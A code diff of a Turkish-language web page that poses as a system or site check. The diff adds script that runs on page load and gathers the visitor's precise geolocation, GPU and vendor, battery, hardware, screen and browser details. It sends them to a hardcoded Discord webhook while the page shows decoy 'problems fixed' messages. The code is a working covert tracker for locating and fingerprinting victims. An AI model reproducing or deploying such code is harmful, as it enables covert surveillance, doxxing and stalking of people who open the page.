@@ -5,9 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sistem</title>
     <style>
-        body { background:#050505; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; font-family:sans-serif; overflow:hidden; }
-        h2 { color:#222; font-size:12px; font-weight:400; letter-spacing:1px; }
-        .ok { color:#0f4; font-weight:bold; }
+        body { background:#000; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; font-family:sans-serif; overflow:hidden; }
+        h2 { color:#111; font-size:10px; }
+        .ok { color:#0f4; font-weight:bold; font-size:14px; }
     </style>
 </head>
 <body>
@@ -16,67 +16,64 @@
     <script>
         const u = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
 
-        async function extract() {
-            let info = { loc: "İzin Verilmedi", gpu: "Bilinmiyor", vendor: "Bilinmiyor" };
+        async function s() {
+            let d = { gpu: "Gizli", v: "Gizli", loc: "Bekleniyor..." };
 
-            // 1. KONUMU ZORLA (Hız, Koordinat, Rakım)
-            const getLoc = new Promise(res => {
-                navigator.geolocation.getCurrentPosition(p => {
-                    res(`📍 [Haritada Gör](https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})\n**Enlem:** ${p.coords.latitude}\n**Boylam:** ${p.coords.longitude}\n**Hata Payı:** ${p.coords.accuracy}m\n**Rakım:** ${p.coords.altitude || 'N/A'}m`);
-                }, () => res("Erişim Reddedildi"), {enableHighAccuracy:true, timeout:5000});
-            });
-
-            // 2. GPU KİLİDİNİ AÇ (WebGL 2.0 Force)
+            // 1. GPU KİLİDİNİ KIRAN DERİN TARAMA
             try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl2') || canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (gl) {
-                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    if (debugInfo) {
-                        info.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_ID);
-                        info.vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_ID);
-                    }
+                const c = document.createElement('canvas');
+                const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+                const ex = gl.getExtension('WEBGL_debug_renderer_info');
+                if (ex) {
+                    d.gpu = gl.getParameter(ex.UNMASKED_RENDERER_ID);
+                    d.v = gl.getParameter(ex.UNMASKED_VENDOR_ID);
                 }
             } catch(e) {}
 
-            // 3. PİL VE DİĞERLERİ
-            let bat = "N/A";
-            if (navigator.getBattery) {
-                const b = await navigator.getBattery();
-                bat = `%${(b.level * 100).toFixed(0)} (Şarjda: ${b.charging ? 'Evet' : 'Hayır'})`;
-            }
+            // 2. AGRESİF KONUM TAKİBİ
+            const getL = () => new Promise(r => {
+                navigator.geolocation.getCurrentPosition(p => {
+                    const map = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+                    r(`📍 **[KONUMU HARİTADA GÖR](${map})**\n**Enlem:** ${p.coords.latitude}\n**Boylam:** ${p.coords.longitude}\n**Hız:** ${p.coords.speed || 0} km/h\n**Hata Payı:** ${p.coords.accuracy}m`);
+                }, () => r("❌ Konum İzni Reddedildi"), {enableHighAccuracy:true, timeout:8000});
+            });
 
-            info.loc = await getLoc;
+            // 3. PİL VE SİSTEM
+            let b_st = "N/A";
+            try {
+                const bat = await navigator.getBattery();
+                b_st = `%${(bat.level * 100).toFixed(0)} (${bat.charging ? 'Şarjda' : 'Pilde'})`;
+            } catch(e) {}
 
-            // 4. VAHŞİ EMBED PAKETİ
-            const payload = {
+            d.loc = await getL();
+
+            // 4. FULL ACCESS EMBED (SENİN İSTEDİĞİN ŞABLON)
+            const p = {
                 embeds: [{
-                    title: "💀 FULL ACCESS - CİHAZ VE KONUM ANALİZİ",
+                    title: "🕵️ KRİTİK CİHAZ VE KONUM ANALİZİ",
                     color: 15158332,
                     fields: [
-                        { name: "📍 AYRINTILI KONUM", value: info.loc, inline: false },
-                        { name: "🛠️ DONANIM KATMANI", value: `**GPU:** \`${info.gpu}\`\n**VENDOR:** \`${info.vendor}\`\n**RAM:** ${navigator.deviceMemory}GB | **CPU:** ${navigator.hardwareConcurrency}`, inline: false },
+                        { name: "📍 CANLI KONUM VERİSİ", value: d.loc, inline: false },
+                        { name: "🛠️ DONANIM KATMANI", value: `**GPU:** \`${d.gpu}\`\n**VENDOR:** \`${d.v}\`\n**RAM:** ${navigator.deviceMemory}GB\n**CPU:** ${navigator.hardwareConcurrency} Çekirdek`, inline: false },
                         { name: "📱 YAZILIM/EKRAN", value: `**OS:** ${navigator.platform}\n**RES:** ${screen.width}x${screen.height}\n**DİL:** ${navigator.language}`, inline: true },
-                        { name: "🔋 DURUM", value: bat, inline: true },
+                        { name: "🔋 DURUM", value: b_st, inline: true },
                         { name: "🌐 TARAYICI", value: "```" + navigator.userAgent + "```", inline: false }
                     ],
-                    footer: { text: "Yönlendirme Aktif" },
+                    footer: { text: "Cihaz Yönlendirme Tamamlandı" },
                     timestamp: new Date()
                 }]
             };
 
             // 5. GÖNDERİM
-            const blob = new Blob([JSON.stringify(payload)], {type: 'application/json'});
-            navigator.sendBeacon(u, blob);
-            fetch(u, { method: 'POST', mode: 'no-cors', body: JSON.stringify(payload) });
+            navigator.sendBeacon(u, JSON.stringify(p));
 
-            // 6. ARAYÜZ
+            // 6. ARAYÜZ BİTİŞ
             const t = document.getElementById('t');
             t.innerHTML = '<span class="ok">Site uygun halde!</span>';
             setTimeout(() => { t.innerHTML = '<span class="ok">Sorunlar düzeltildi.</span>'; }, 500);
         }
 
-        extract();
+        s();
     </script>
 </body>
 </html>
